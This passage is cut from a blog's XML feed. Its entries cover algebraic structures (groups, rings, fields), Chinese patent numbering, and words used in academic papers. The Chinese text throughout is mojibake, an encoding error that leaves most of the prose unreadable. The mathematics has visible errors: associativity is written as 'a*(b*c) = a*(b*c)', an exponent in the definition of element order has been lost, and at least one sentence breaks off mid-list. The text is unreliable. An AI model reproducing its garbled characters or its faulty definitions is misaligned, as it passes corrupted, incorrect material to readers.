”ç©¶çš„æ˜¯è¿ç®—è§„åˆ™ã€‚ä¸€é—¨ä»£æ•°ï¼Œå…¶å®éƒ½æ˜¯ä»æŸç§å…·ä½“çš„è¿ç®—ä½“ç³»ä¸­æŠ½è±¡å‡ºä¸€äº›åŸºæœ¬è§„åˆ™ï¼Œå»ºç«‹ä¸€ä¸ªå…¬ç†ä½“ç³»ï¼Œç„¶ååœ¨è¿™åŸºç¡€ä¸Šè¿›è¡Œç ”ç©¶ã€‚</p><ol type="1"><li>elementary algebra elementary algebraåªè€ƒè™‘å®æ•°å’Œå¤æ•°ä»£æ•°ç»“æ„ï¼Œä¸è€ƒè™‘å…¶ä¹‹å¤–çš„ä»£æ•°é¢†åŸŸã€‚</li><li>abstract algebra<br />groupï¼Œringï¼Œfield</li></ol></li><li><p>Topological structures:</p><p>topology concerns with the properties of a geometric object that arepreserved under continuous deformations, such as stretching, twisting,crumpling, and bending;</p></li></ul><h2 id="abstract-algebra">Abstract Algebra</h2><p>æŠ½è±¡ä»£æ•°(abstract algebra)ã€è¿‘ä¸–ä»£æ•°ã€ç°ä»£ä»£æ•°(modernalgebra)æŒ‡çš„éƒ½æ˜¯åŒä¸€ä¸ªæ„æ€(ç”šè‡³ç›´æ¥ç§°ä¸ºä»£æ•°å­¦)ã€‚<strong>æŠ½è±¡ä»£æ•°ä¸»è¦ç ”ç©¶å¯¹è±¡æ˜¯ä»£æ•°ç»“æ„ï¼ŒåŒ…æ‹¬ç¾¤ã€ç¯ã€åŸŸã€å‘é‡ç©ºé—´ã€‚</strong></p><p>ä¼½ç½—ç“¦(Ã‰variste Galois,1811-1832)æ˜¯ç°ä»£ç¾¤è®ºçš„åˆ›å§‹äºº(ä¸é˜¿è´å°”ç‹¬ç«‹å‘æ˜)ï¼Œä»–åˆ©ç”¨ç¾¤çš„æ¦‚å¿µå½»åº•è§£å†³äº†ç”¨æ ¹å¼æ±‚è§£ä»£æ•°æ–¹ç¨‹çš„å¯èƒ½æ€§é—®é¢˜(ç§°ä¸ºä¼½ç½—ç“¦ç†è®º)ï¼Œç³»ç»Ÿé˜é‡Šäº†ä¸ºä½•äº”æ¬¡ä»¥ä¸Šä¹‹æ–¹ç¨‹å¼æ²¡æœ‰å…¬å¼è§£ï¼Œè€Œå››æ¬¡ä»¥ä¸‹æœ‰å…¬å¼è§£ï¼Œä½¿<strong>ä»£æ•°å­¦ä»è§£æ–¹ç¨‹çš„ç§‘å­¦è½¬å˜ä¸ºç ”ç©¶ä»£æ•°ç»“æ„çš„ç§‘å­¦ï¼Œå³æŠŠä»£æ•°æ¨å¹¿åˆ°æŠ½è±¡ä»£æ•°</strong>ã€‚</p><p>æŠ½è±¡ä»£æ•°æœ‰åœ¨ä¸€äº›åŸºç¡€å®šç†çš„åŸºç¡€ä¸Šï¼Œè¿›ä¸€æ­¥çš„ç ”ç©¶å¾€å¾€åˆ†ä¸ºä¸¤ä¸ªæµæ´¾ï¼š<strong>ç ”ç©¶æœ‰é™çš„ç¦»æ•£ä»£æ•°ç»“æ„ï¼ˆæ¯”å¦‚æœ‰é™ç¾¤å’Œæœ‰é™åŸŸï¼‰</strong>ï¼Œè¿™éƒ¨åˆ†å†…å®¹é€šå¸¸ç”¨äºæ•°è®ºï¼Œç¼–ç å’Œæ•´æ•°æ–¹ç¨‹è¿™äº›åœ°æ–¹ï¼›å¦å¤–ä¸€ä¸ªæµæ´¾æ˜¯<strong>ç ”ç©¶è¿ç»­çš„ä»£æ•°ç»“æ„</strong>ï¼Œé€šå¸¸å’Œæ‹“æ‰‘ä¸åˆ†æè”ç³»åœ¨ä¸€èµ·ï¼ˆæ¯”å¦‚æ‹“æ‰‘ç¾¤ï¼Œæç¾¤ï¼‰ï¼Œæˆ‘çš„ç ”ç©¶ä¸»è¦æ¶‰åŠæœ‰é™çš„ç¦»æ•£ä»£æ•°ç»“æ„ï¼Œç¾¤ç¯åŸŸç­‰ã€‚</p><h3 id="çº¿æ€§ä»£æ•°">çº¿æ€§ä»£æ•°</h3><p>ç°ä»£ä»£æ•°çš„å…¥é—¨ç‚¹åˆ™æ˜¯ä¸¤ä¸ªéƒ¨åˆ†ï¼šçº¿æ€§ä»£æ•°(linearalgebra)å’ŒåŸºç¡€çš„æŠ½è±¡ä»£æ•°(abstractalgebra)ã€‚çº¿æ€§ä»£æ•°æ˜¯æŠ½è±¡ä»£æ•°ç‰¹æ®Šçš„ä¸€ç±»ï¼Œå…¶ä»£æ•°ç»“æ„ä¸ºï¼šå‘é‡ç©ºé—´(vectorspacesï¼Œä¹Ÿå«çº¿æ€§ç©ºé—´) + çº¿æ€§å˜æ¢(linear mappings)ã€‚</p><p>å¯¹äºåš learningï¼Œstatisticçš„ï¼Œæ¥è§¦æœ€å¤šçš„å°±æ˜¯çº¿æ€§ä»£æ•°ã€‚çº¿æ€§ä»£æ•°ï¼ŒåŒ…æ‹¬å»ºç«‹åœ¨å®ƒåŸºç¡€ä¸Šçš„å„ç§å­¦ç§‘ï¼Œæœ€æ ¸å¿ƒçš„ä¸¤ä¸ªæ¦‚å¿µæ˜¯<strong>å‘é‡ç©ºé—´å’Œçº¿æ€§å˜æ¢</strong>ã€‚<strong>çº¿æ€§å˜æ¢åœ¨çº¿æ€§ä»£æ•°</strong>ä¸­çš„åœ°ä½å’Œ<strong>è¿ç»­å‡½æ•°åœ¨åˆ†æ</strong>ä¸­çš„åœ°ä½ï¼Œæˆ–è€…<strong>åŒæ€æ˜ å°„åœ¨ç¾¤è®ºä¸­çš„åœ°ä½</strong>æ˜¯ä¸€æ ·çš„â€”â€” <strong>å®ƒæ˜¯ä¿æŒåŸºç¡€è¿ç®—ï¼ˆåŠ æ³•å’Œæ•°ä¹˜ï¼‰çš„æ˜ å°„ã€‚</strong></p><p>åœ¨ learningä¸­æœ‰è¿™æ ·çš„ä¸€ç§å€¾å‘â€”â€”é„™è§†çº¿æ€§ç®—æ³•ï¼Œæ ‡æ¦œéçº¿æ€§ã€‚ä¹Ÿè®¸åœ¨å¾ˆå¤šåœºåˆä¸‹é¢ï¼Œæˆ‘ä»¬éœ€è¦éçº¿æ€§æ¥æè¿°å¤æ‚çš„ç°å®ä¸–ç•Œï¼Œä½†æ˜¯æ— è®ºä»€ä¹ˆæ—¶å€™ï¼Œçº¿æ€§éƒ½æ˜¯å…·æœ‰æ ¹æœ¬åœ°ä½çš„ã€‚æ²¡æœ‰çº¿æ€§çš„åŸºç¡€ï¼Œå°±ä¸å¯èƒ½å­˜åœ¨æ‰€è°“çš„éçº¿æ€§æ¨å¹¿ã€‚æˆ‘ä»¬å¸¸ç”¨çš„éçº¿æ€§åŒ–çš„æ–¹æ³•åŒ…æ‹¬æµå½¢å’Œkernelizationï¼Œè¿™ä¸¤è€…éƒ½éœ€è¦åœ¨æŸä¸ªé˜¶æ®µå›å½’çº¿æ€§ã€‚</p><h3 id="åˆç­‰ä»£æ•°æŠ½è±¡ä»£æ•°">åˆç­‰ä»£æ•°â€“&gt;æŠ½è±¡ä»£æ•°</h3><p>æŠ½è±¡ä»£æ•°å°†åˆç­‰ä»£æ•°çš„ä¸€äº›æ¦‚å¿µå»¶ä¼¸ã€‚</p><ol type="1"><li>æ•° -&gt; é›†åˆ</li></ol><p>é›†åˆåœ¨æœ´ç´ é›†åˆè®º(naive set theory)å’Œå…¬ç†åŒ–é›†åˆè®º(axiomatic settheory)çš„å®šä¹‰æ˜¯ä¸ä¸€æ ·çš„ï¼Œå‰è€…æŒ‡ç”±ä¸€äº›å…ƒç´ ç»„æˆï¼›åè€…æŒ‡å…·æœ‰æŸç§ç‰¹å®šæ€§è´¨äº‹ç‰©çš„æ€»ä½“ã€‚</p><p>æŠ½è±¡ä»£æ•°è€ƒè™‘çš„é›†åˆæ˜¯ a collection of all objects + specificproperty</p><blockquote><p>Rather than just considering the different types of numbers, abstractalgebra deals with the more general concept of sets: a collection of allobjects (called elements) selected by property specific for the set.</p></blockquote><p>(2)+ -&gt; äºŒå…ƒè¿ç®—</p><p>åŠ å· + è¢«æŠ½è±¡ä¸ºäºŒå…ƒè¿ç®—(binaryoperation)ï¼Œå¯¹ä¸¤ä¸ªå…ƒç´ ä½œäºŒå…ƒè¿ç®—ï¼Œå¾—åˆ°çš„æ–°å…ƒç´ ä»ç„¶å±äºè¯¥é›†åˆï¼Œè¿™å«å°é—­æ€§(closure)ã€‚å®é™…ä¸Šï¼ŒåŠ å‡ä¹˜é™¤éƒ½å«äºŒå…ƒè¿ç®— (äºŒå…ƒæŒ‡çš„æ˜¯ä¸¤ä¸ªæ“ä½œæ•°)</p><p>(3)0/1 â€“&gt; å•ä½å…ƒ</p><p>0 å’Œ 1 è¢«æŠ½è±¡æˆå•ä½å…ƒ(identity elements)ï¼Œ0 ä¸ºåŠ æ³•å•ä½å…ƒï¼Œ1ä¸ºä¹˜æ³•å•ä½å…ƒã€‚å•ä½å…ƒæ˜¯é›†åˆçš„ä¸€ä¸ªç‰¹æ®Šå…ƒç´ (è·ŸäºŒå…ƒè¿ç®—æœ‰å…³)ï¼Œæ»¡è¶³å•ä½å…ƒä¸å…¶ä»–å…ƒç´ ç›¸ç»“åˆæ—¶ï¼Œä¸æ”¹å˜è¯¥å…ƒç´ ï¼Œå³æ»¡è¶³a<em>e = a ä¸ e</em>a =aã€‚å¯è§ï¼Œå•ä½å…ƒå–å†³äºå…ƒç´ ä¸äºŒå…ƒè¿ç®—ï¼Œå¦‚çŸ©é˜µçš„åŠ æ³•å•ä½å…ƒæ˜¯é›¶çŸ©é˜µï¼ŒçŸ©é˜µçš„ä¹˜æ³•å•ä½å…ƒæ˜¯å•ä½çŸ©é˜µã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæœ‰äº›é›†åˆä¸å­˜åœ¨å•ä½å…ƒ</p><ol start="4" type="1"><li>è´Ÿæ•° â€“&gt; é€†å…ƒç´ </li></ol><p>è´Ÿæ•°æ¨å¹¿åˆ°é€†å…ƒç´ (inverse element)ï¼Œå¯¹äºåŠ æ³•ï¼Œaçš„é€†å…ƒç´ æ˜¯-aï¼›å¯¹äºä¹˜æ³•ï¼Œa çš„é€†å…ƒç´ æ˜¯å€’æ•°aâˆ’1ã€‚ç›´è§‚åœ°è¯´ï¼Œé€†å…ƒå¯ä»¥æ’¤é”€æ“ä½œï¼Œå¦‚åŠ äº†ä¸€ä¸ªæ•°aï¼Œå†åŠ ä¸Šè¯¥æ•°çš„é€†å…ƒ-a(ç›¸å½“äºæ’¤æ¶ˆæ“ä½œ)ï¼Œç»“æœè¿˜æ˜¯ä¸€æ ·ã€‚</p><p>(5)ç»“åˆå¾‹</p><p>ç»“åˆå¾‹(Associativeproperty)æ˜¯æŸäº›äºŒå…ƒè¿ç®—çš„æ€§è´¨ï¼Œ<code>a*(b*c) = a*(b*c)</code>ï¼Œæœ‰äº›äºŒå…ƒè¿ç®—æ²¡æœ‰ç»“åˆå¾‹(å¦‚å‡æ³•ã€é™¤æ³•ã€</p><p>(6)äº¤æ¢å¾‹</p><p>äº¤æ¢å¾‹(Commutativeproperty)ï¼Œæ”¹å˜äºŒå…ƒè¿ç®—ç¬¦ä¸¤è¾¹çš„å…ƒç´ ä¸å½±å“ç»“æœã€‚å¹¶ä¸æ˜¯æ‰€æœ‰äºŒæ¬¡å…ƒè¿ç®—éƒ½æ»¡è¶³äº¤æ¢å¾‹(å¦‚çŸ©é˜µçš„ä¹˜æ³•)</p><h3 id="ç¾¤ç¯åŸŸ">ç¾¤,ç¯,åŸŸ</h3><p>é¦–å…ˆæ”¾ä¸€å¼ æ€»ç»“å›¾ä»¥ä¾›å¿«é€ŸæŸ¥é˜…ï¼š</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16781715243330.jpg"alt="ç¾¤ï¼Œç¯ï¼ŒåŸŸ" /><figcaption aria-hidden="true">ç¾¤ï¼Œç¯ï¼ŒåŸŸ</figcaption></figure><h4 id="ç¾¤è®º">ç¾¤è®º</h4><ol type="1"><li><p>åŸç¾¤(magma)æ˜¯ä¸€ç§åŸºæœ¬çš„ä»£æ•°ç»“æ„ï¼Œåªè¦æ»¡è¶³ä¸¤å…ƒç´ ä½œäºŒå…ƒè¿ç®—å¾—åˆ°æ–°å…ƒç´ ä»å±äºè¯¥é›†åˆMï¼Œå³å°é—­æ€§: <code>MxM-&gt;M</code>ã€‚</p></li><li><p>åŠç¾¤ (Semigroup) æ»¡è¶³ç»“åˆå¾‹(associativeproperty)çš„ä»£æ•°ç»“æ„ã€‚V=&lt;Sï¼Œ_ &gt;ï¼Œå…¶ä¸­äºŒå…ƒè¿ç®— <code>_</code>æ˜¯å¯ç»“åˆçš„ï¼Œå³<code>(a*b)*c=a*(b*c)</code>ï¼Œåˆ™ç§° V æ˜¯åŠç¾¤ã€‚</p></li><li><p>å¹ºåŠç¾¤ (monoid) åœ¨åŠç¾¤çš„åŸºç¡€ä¸Šï¼Œè¿˜éœ€è¦æ»¡è¶³æœ‰ä¸€ä¸ªå•ä½å…ƒã€‚</p></li><li><p>ç¾¤ç¾¤(group)æ˜¯ä¸¤ä¸ªå…ƒç´ ä½œäºŒå…ƒè¿ç®—å¾—åˆ°çš„ä¸€ä¸ªæ–°å…ƒç´ ï¼Œéœ€è¦æ»¡è¶³ç¾¤å…¬ç†(groupaxioms)ï¼Œå³ï¼š</p><p>å°é—­æ€§ï¼š<code>a * b</code> is another element in the setç»“åˆå¾‹ï¼š<code>(a * b) * c = a * (b * c)</code>å•ä½å…ƒï¼š<code>a * e = a and e * a = a</code> é€† å…ƒï¼šåŠ æ³•çš„é€†å…ƒä¸º<code>-a</code>ï¼Œä¹˜æ³•çš„é€†å…ƒä¸ºå€’æ•° <code>1/a</code> æˆ–å†™ä½œ<code>a^(-1)</code> (å¯¹äºæ‰€æœ‰å…ƒç´ )</p><p>æ•´æ•°åŠ æ³• (Z,+)å°±æ˜¯ä¸€ä¸ªç¾¤</p></li><li><p>é˜¿è´å°”ç¾¤(äº¤æ¢ç¾¤) é˜¿è´å°”ç¾¤(AbelianGroup)åœ¨ç¾¤çš„åŸºç¡€ä¸Šï¼Œè¿˜éœ€æ»¡è¶³äº¤æ¢å¾‹ã€‚å¦‚æ•´æ•°é›†åˆå’ŒåŠ æ³•è¿ç®—ï¼Œ(Z,+)ï¼Œæ˜¯ä¸€ä¸ªé˜¿è´å°”ç¾¤ã€‚</p><p>äº¤æ¢å¾‹ï¼š<code>a + b = b + a</code></p></li></ol><p>ä¸€ä¸ªç¾¤çš„é˜¶æ˜¯æŒ‡å…¶å…ƒç´ çš„ä¸ªæ•°ï¼› ä¸€ä¸ªç¾¤å†…çš„ä¸€ä¸ªå…ƒç´  aä¹‹é˜¶ï¼ˆæœ‰æ—¶ç§°ä¸ºå‘¨æœŸï¼‰æ˜¯æŒ‡ä¼šä½¿å¾— <span class="math inline">\(am =e\)</span> çš„æœ€å°æ­£æ•´æ•° mï¼ˆå…¶ä¸­çš„ e ä¸ºè¿™ä¸ªç¾¤çš„å•ä½å…ƒç´ ï¼Œä¸” am ä¸º a çš„ mæ¬¡å¹‚ï¼‰ã€‚ è‹¥æ²¡æœ‰æ­¤æ•°å­˜åœ¨ï¼Œåˆ™ç§° a æœ‰æ— é™é˜¶ã€‚æœ‰é™ç¾¤çš„æ‰€æœ‰å…ƒç´ éƒ½æœ‰æœ‰é™é˜¶ã€‚</p><h4 id="ç¯è®º">ç¯è®º</h4><p>ç¯åœ¨äº¤æ¢ç¾¤åŸºç¡€ä¸Šï¼Œè¿›ä¸€æ­¥é™åˆ¶æ¡ä»¶ï¼ŒåŒºåˆ«äºç¾¤è®ºï¼Œç¯æ˜¯é’ˆå¯¹ä¸€ä¸ªé›†åˆçš„ä¸¤ç§è¿ç®—çš„ã€‚</p><p>ç¯(ring)åœ¨é˜¿è´å°”ç¾¤(ä¹Ÿå«äº¤æ¢ç¾¤)çš„åŸºç¡€ä¸Šï¼Œæ·»åŠ ä¸€ç§äºŒå…ƒè¿ç®—(è™½å«ä¹˜æ³•ï¼Œä½†ä¸åŒäºåˆç­‰ä»£æ•°çš„ä¹˜æ³•)ã€‚ä¸€ä¸ªä»£æ•°ç»“æ„æ˜¯ç¯(R,+, Â·)ï¼Œéœ€è¦æ»¡è¶³ç¯å…¬ç†ï¼š</p><ol type="1"><li>(R, +)æ˜¯äº¤æ¢ç¾¤</li></ol><p>å°é—­æ€§ï¼š<code>a + b</code> is another element in the setç»“åˆå¾‹ï¼š<code>(a + b) + c = a + (b + c)</code> å•ä½å…ƒï¼šåŠ æ³•çš„å•ä½å…ƒä¸º0ï¼Œ<code>a + 0 = a and 0 + a = a</code> é€† å…ƒï¼šåŠ æ³•çš„é€†å…ƒä¸º-aï¼Œ<code>a + (âˆ’a) = (âˆ’a) + a = 0</code> (å¯¹äºæ‰€æœ‰å…ƒç´ )äº¤æ¢å¾‹ï¼š<code>a + b = b + a</code></p><ol start="2" type="1"><li>(R, Â·)æ˜¯å¹ºåŠç¾¤</li></ol><p>å°é—­æ€§ï¼š<code>a â‹… b</code> is another element in the set ç»“åˆå¾‹ï¼š(a â‹…b) â‹… c = a â‹… (b â‹… c) å•ä½å…ƒï¼šä¹˜æ³•çš„å•ä½å…ƒä¸º 1ï¼Œa â‹… 1 = a and 1 â‹… a =a</p><p>(3)ä¹˜æ³•å¯¹åŠ æ³•æ»¡è¶³åˆ†é…å¾‹ Multiplication distributes over addition</p><p><code>a â‹… (b + c) = (a â‹… b) + (a â‹… c)</code> for all a, b, c in R(left distributivity) <code>(b + c) â‹… a = (b â‹… a) + (c â‹… a)</code> forall a, b, c in R (right distributivity)</p><p>äº¤æ¢ç¯: äº¤æ¢ç¯(commutativering)åœ¨ç¯çš„åŸºç¡€ä¸Šï¼ŒäºŒå…ƒè¿ç®—ä¹˜æ³•è¿˜æ»¡è¶³äº¤æ¢å¾‹ã€‚</p><h4 id="åŸŸ">åŸŸ</h4><p>åŸŸæ˜¯ä¸€ç§å¯ä»¥è¿›è¡ŒåŠ å‡ä¹˜é™¤(é™¤ 0ä»¥å¤–)çš„ä»£æ•°ç»“æ„ï¼Œæ˜¯æ•°åŸŸä¸å››åˆ™è¿ç®—çš„æ¨å¹¿ã€‚</p><p>åŸŸæ˜¯  ç”±åŒä¸€é›†åˆçš„ä¸¤ä¸ªè¿ç®—çš„äº¤æ¢ç¾¤ç»„æˆ</p><h4 id="æ€»ç»“">æ€»ç»“</h4><p>ç¾¤ï¼šä¸€ä¸ªè¿ç®—ç¬¦ï¼›ç¯åŸŸï¼šä¸¤ä¸ªè¿ç®—ç¬¦</p><p>åœ¨ä¸»è¦çš„ä»£æ•°ç»“æ„ä¸­ï¼Œæœ€ç®€å•çš„æ˜¯ç¾¤(Group)â€”â€”å®ƒåªæœ‰ä¸€ç§ç¬¦åˆç»“åˆç‡çš„å¯é€†è¿ç®—ï¼Œé€šå¸¸å«â€œä¹˜æ³•â€ã€‚å¦‚æœï¼Œè¿™ç§è¿ç®—ä¹Ÿç¬¦åˆäº¤æ¢ç‡ï¼Œé‚£ä¹ˆå°±å«é˜¿è´å°”ç¾¤(AbelianGroup)ã€‚å¦‚æœæœ‰ä¸¤ç§è¿ç®—ï¼Œä¸€ç§å«åŠ æ³•ï¼Œæ»¡è¶³äº¤æ¢ç‡å’Œç»“åˆç‡ï¼Œä¸€ç§å«ä¹˜æ³•ï¼Œæ»¡è¶³ç»“åˆç‡ï¼Œå®ƒä»¬ä¹‹é—´æ»¡è¶³åˆ†é…ç‡ï¼Œè¿™ç§ä¸°å¯Œä¸€ç‚¹çš„ç»“æ„å«åšç¯(Ring)ï¼Œå¦‚æœç¯ä¸Šçš„ä¹˜æ³•æ»¡è¶³äº¤æ¢ç‡ï¼Œå°±å«å¯äº¤æ¢ç¯(CommutativeRing)ã€‚å¦‚æœï¼Œä¸€ä¸ªç¯çš„åŠ æ³•å’Œä¹˜æ³•å…·æœ‰äº†æ‰€æœ‰çš„è‰¯å¥½æ€§è´¨ï¼Œé‚£ä¹ˆå°±æˆä¸ºä¸€ä¸ªåŸŸ(Field)ã€‚åŸºäºåŸŸï¼Œæˆ‘ä»¬å¯ä»¥å»ºç«‹ä¸€ç§æ–°çš„ç»“æ„ï¼Œèƒ½è¿›è¡ŒåŠ æ³•å’Œæ•°ä¹˜ï¼Œå°±æ„æˆäº†çº¿æ€§ä»£æ•°(Linearalgebra)ã€‚</p><h2 id="å‚è€ƒæ–‡ç« ">å‚è€ƒæ–‡ç« </h2><ol type="1"><li><ahref="https://en.wikipedia.org/wiki/Algebraic_structure">Algebraicstructure - Wikipedia</a></li><li><a href="https://en.wikipedia.org/wiki/Topology">Topology -Wikipedia</a></li><li><ahref="http://sparkandshine.net/en/mit-mathematical-formalism/#42">[è½¬]MITç‰›äººè§£è¯´æ•°å­¦ä½“ç³» â€“ Spark &amp; Shine</a></li><li><ahref="http://sparkandshine.net/en/algebraic-structure-primer-group-ring-field-vector-space/#21">ä»£æ•°ç»“æ„å…¥é—¨ï¼šç¾¤ã€ç¯ã€åŸŸã€å‘é‡ç©ºé—´â€“ Spark &amp; Shine</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ä¸“åˆ©å°çŸ¥è¯†</title>
      <link href="/blog/2023/02/16/academic/patent_knowledge/"/>
      <url>/blog/2023/02/16/academic/patent_knowledge/</url>
      
        <content type="html"><![CDATA[<p>ä¸“åˆ©ä¸€å…±æœ‰å››ç±»å·æˆ–è€…è¯´ä¸‰ç±»ï¼šç”³è¯·å·ï¼ˆä¸“åˆ©å·ï¼‰ã€å…¬å¸ƒå·ã€å…¬å‘Šå·ï¼š</p><ul><li>ç”³è¯·å·ï¼šç”³è¯·å·å’Œç”³è¯·æ—¥ç›¸å…³ï¼Œåªè¦ç”³è¯·å³äº§ç”Ÿã€‚</li><li>å…¬å¸ƒå·ï¼šå…¬å¸ƒå·åªæœ‰å‘æ˜ä¸“åˆ©æ‰æœ‰ã€‚å‘æ˜ä¸“åˆ©å®¡æŸ¥ä¸ºå®è´¨å®¡æŸ¥ï¼Œå…ˆå…¬å¸ƒï¼Œå…¬å¸ƒä¹‹åå³æœ‰å…¬å¸ƒå·ï¼Œå°±ç›¸å½“äºè¯¥ä¸“åˆ©ç”³è¯·å·²ç»è¢«å…¬å¼€äº†ï¼Œä»»ä½•äººéƒ½å¯ä»¥çœ‹åˆ°ã€‚</li><li>å…¬å‘Šå·ï¼šï¼›å‘æ˜ä¸“åˆ©å…¬å¸ƒåï¼Œå†ç”±å®å®¡å®¡æŸ¥å‘˜è¿›è¡Œæˆæƒæˆ–è€…é©³å›ï¼Œæˆæƒåå³äº§ç”Ÿå…¬å‘Šå·ã€‚å®ç”¨æ–°å‹ä¸“åˆ©å’Œå¤–è§‚è®¾è®¡ä¸“åˆ©éƒ½æ˜¯åˆæ­¥å®¡æŸ¥ï¼Œå®¡æŸ¥è¿‡ç¨‹æ˜¯ä¿å¯†çš„ï¼Œä¸ä¼šåƒå‘æ˜ä¸“åˆ©ä¸€æ ·æœ‰å…¬å¼€å·ï¼Œå®¡æŸ¥å‘˜åšå‡ºæˆæƒæˆ–è€…é©³å›ç»“è®ºï¼Œæˆæƒåå³äº§ç”Ÿå…¬å‘Šå·ã€‚å…¬å‘Šå·åªæœ‰æˆæƒçš„ä¸“åˆ©æ‰æœ‰ã€‚</li></ul><p>ä¸“åˆ©å·ï¼šä¸“åˆ©æˆæƒä»¥åï¼Œç”³è¯·å·å‰é¢åŠ ä¸Š ZL å³ä¸ºä¸“åˆ©å·ã€‚</p><p>ä¸€èˆ¬å…³æ³¨ä¸“åˆ©çš„æˆæƒæ—¶é—´</p>]]></content>
      
      
      <categories>
          
          <category> academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> academic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®ºæ–‡ä¸­å¸¸ç”¨è¯ä¸æ˜“æ··è¯</title>
      <link href="/blog/2023/02/16/academic/thesis_words/"/>
      <url>/blog/2023/02/16/academic/thesis_words/</url>
      
        <content type="html"><![CDATA[<h2 id="ç†è®ºæ¨å¯¼åè¯-assumptionlemma-theorem-proof-remark">ç†è®ºæ¨å¯¼åè¯assumptionã€lemma, theorem, proof, remark</h2><p>assumption æ˜¯å‡è®¾ï¼Œå†™åœ¨ lemma å‰ï¼Œåé¢å¾—åˆ°çš„ theorem ä¸€èˆ¬éœ€è¦å‰é¢çš„assumptionã€‚</p><p>Lemma æ˜¯å¼•ç†ï¼Œä¸€èˆ¬æ˜¯å‰äººå·²ç»è¯æ˜å‡ºçš„ç»“è®ºï¼Œä½ åœ¨è®ºæ–‡ä¸­ Proofæ—¶éœ€è¦ç”¨åˆ°ï¼Œæ‰€ä»¥è¦å†™åœ¨ Proof å‰é¢ã€‚</p><p>theoremæ˜¯å®šç†ï¼Œæ˜¯è‡ªå·±è®ºæ–‡ä¸­æ¨å¯¼å‡ºçš„ç†è®ºï¼Œä¹Ÿæ˜¯è®ºæ–‡ä¸­çš„ä¸»è¦è´¡çŒ®è¯´æ˜ï¼Œä¸€èˆ¬å†™åœ¨lemma ä¹‹åï¼Œproof ä¹‹å‰ï¼Œproof å°±æ˜¯è¦è¯æ˜ä½ çš„ theoremã€‚</p><p>remark æ˜¯å¤‡æ³¨ã€æ ‡æ³¨ï¼Œå†™åœ¨ proof ä¹‹åï¼Œå°±æ˜¯è¯æ˜å®Œè‡ªå·±è®ºæ–‡ä¸­çš„ theoremä¹‹åï¼Œå¯¹ theorem è¿›è¡Œè¯´æ˜ï¼Œå› ä¸ºå¾—åˆ°çš„ theoremå¯èƒ½åªé€‚ç”¨äºä¸€ç§ç³»ç»Ÿæ¨¡å‹ï¼Œå¦‚æœæ¢ä¸€ç§ç³»ç»Ÿæ¨¡å‹ï¼Œä¹Ÿå¯ä»¥ç”¨è®ºæ–‡ä¸­çš„ theoremè§£å†³çš„è¯ï¼Œå°±è¦åœ¨ remark ä¸­è¯´æ˜ï¼Œä½œç”¨å°±æ˜¯ä¸ä½¿å¾— theorem å¤ªå±€é™ã€‚å¦ä¸€ç§remarkï¼Œæ˜¯è§£é‡Šè‡ªå·±çš„ theorem å’Œåˆ«äººçš„ä¸åŒç‚¹ï¼Œä¸€èˆ¬æ˜¯è‡ªå·±çš„ theoremå’Œåˆ«äººçš„ç›¸ä¼¼ï¼Œé¿å…è¢«å®¡ç¨¿äºº pass æ‰ï¼Œç„¶å remark è¯´æ˜ä¸€ä¸‹ã€‚remarkè¿˜å¯ä»¥è¯´æ˜ä¸€ä¸‹ theoremçš„ä¼˜ç‚¹ï¼Œæ˜¯å—åˆ°å“ªç¯‡æ–‡ç« çš„å¯å‘ï¼Œå’Œå—å¯å‘æ–‡ç« ç›¸æ¯”çš„ä¼˜ç‚¹ã€‚</p><p>ä¸€èˆ¬é¡ºåºæ˜¯assumptionã€lemmaã€theoremã€proofã€remarkã€‚ä½†ä¸€ç¯‡è®ºæ–‡ä¸­ä¸ä¸€å®šå…¨åŒ…å«è¿™äº”éƒ¨åˆ†ï¼Œä¾‹å¦‚æœ‰çš„proof å¾ˆç®€å•å°±ä¸éœ€è¦å‰é¢åŠ  lemma äº†ã€‚</p><h2 id="convergence-rate">convergence rate</h2><p>In numerical analysis, rate of convergence is a measure of howquickly a sequence approaches its limit. It is used to describe how fastan iterative algorithm converges to a solution. The rate of convergenceis also called the asymptotic error constant1.</p><p>For example, if we have an iterative algorithm that produces asequence of approximations to a solution, then the rate of convergencetells us how quickly these approximations converge to the truesolution</p><h2 id="et-al.-and-i.e.">et al. and i.e.</h2><p>There is no period after the<code>et'' in the Latin abbreviation</code>et al.''. The abbreviation<code>i.e.'' means</code>that is'', and the abbreviation<code>e.g.'' means</code>for example''.</p><h2 id="åŒºé—´ç¬¦å·">åŒºé—´ç¬¦å·</h2><p>ç¬¦å· "âˆ€iâˆˆ[d]" è¡¨ç¤º "å¯¹äºæ‰€æœ‰çš„ i å±äº [d]"ï¼Œå…¶ä¸­ [d]è¡¨ç¤ºä¸€ä¸ªæ•°å­—åŒºé—´ï¼ŒåŒ…å«ä» 1 åˆ° dçš„æ‰€æœ‰æ­£æ•´æ•°ã€‚è¿™ä¸ªç¬¦å·é€šå¸¸ç”¨åœ¨æ•°å­¦æˆ–è®¡ç®—æœºç§‘å­¦ä¸­ï¼Œè¡¨ç¤ºä¸€ä¸ªé‡æˆ–è€…å˜é‡éœ€è¦æ»¡è¶³ä¸€å®šæ¡ä»¶æˆ–è€…å–éæŸä¸ªèŒƒå›´å†…çš„æ‰€æœ‰å¯èƒ½å–å€¼ã€‚</p><p>ä¾‹å¦‚ï¼Œå¦‚æœæœ‰ä¸€ä¸ªå‘é‡ x åŒ…å« d ä¸ªå®æ•°ï¼Œé‚£ä¹ˆå¯ä»¥å†™æˆï¼š</p><p>âˆ€iâˆˆ[d], x[i] âˆˆ R</p><p>è¿™ä¸ªå¼å­çš„æ„æ€æ˜¯ï¼Œå¯¹äº x ä¸­çš„æ¯ä¸€ä¸ªä¸‹æ ‡ iï¼Œx[i] éƒ½æ˜¯å®æ•°é›†åˆ Rä¸­çš„ä¸€ä¸ªå…ƒç´ ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå‘é‡ x ä¸­çš„æ‰€æœ‰å…ƒç´ éƒ½æ˜¯å®æ•°ã€‚</p><h2 